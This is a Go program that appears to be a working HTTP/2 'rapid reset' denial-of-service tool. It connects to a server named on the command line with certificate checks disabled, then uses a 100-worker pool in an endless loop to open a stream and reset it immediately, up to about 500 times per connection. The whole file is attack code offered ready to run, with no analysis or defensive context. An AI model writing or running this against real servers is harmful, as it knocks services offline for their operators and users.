package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"log"
	"os"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"

	"github.com/alitto/pond"
)

func main() {
    if len(os.Args) < 2 {
        fmt.Println("Usage:", os.Args[0], "SERVER_ADDRESS")
        return
    }
    serverAddr := os.Args[1] 

    tlsConfig := &tls.Config{
        InsecureSkipVerify: true,
        NextProtos:         []string{"h2"},
    }


    var buf bytes.Buffer
    encoder := hpack.NewEncoder(&buf)

    headers := []struct {
        Name, Value string
    }{
        {":method", "GET"},
        {":path", "/"},
        {":authority", "example.com"},
        {":scheme", "https"},
    }

    for _, header := range headers {
        err := encoder.WriteField(hpack.HeaderField{Name: header.Name, Value: header.Value})
        if err != nil {
            log.Fatalf("Failed to encode header: %v", err)
        }
    }

    pool := pond.New(100, 1000)

    for {
        // Infinite loop for repeatedly connecting and resetting
        pool.Submit(func() {
            conn, err := tls.Dial("tcp", serverAddr, tlsConfig)
            if err != nil {
                log.Fatalf("Failed to connect: %v", err)
            }
            defer conn.Close()
            framer := http2.NewFramer(conn, conn)
            // A SETTINGS frame must be sent at the start of the connection.
            if err := framer.WriteSettings(); err != nil {
                log.Fatalf("Failed to write settings: %v", err)
            }

            for i:=uint32(1); i<1000;i+=2{

                // Send the HEADERS frame to initiate a new stream
                if err := framer.WriteHeaders(http2.HeadersFrameParam{
                    StreamID:      i, // Client-initiated streams are odd-numbered
                    BlockFragment: buf.Bytes(),
                    EndStream:     true,
                    EndHeaders:    true,
                }); err != nil {
                    //log.Printf("Failed to write headers: %v", err)
                    break
                }

                if err := framer.WriteRSTStream(i, http2.ErrCodeCancel); err != nil {
                    //log.Printf("Failed to write RST_STREAM: %v", err)
                    break
                }

                // Give server some time to process (this might be adjusted or removed as necessary)
                //time.Sleep(10 * time.Millisecond)
                //log.Printf("wrote stream")
            }
        })
        time.Sleep(10 * time.Millisecond)
    } 
}
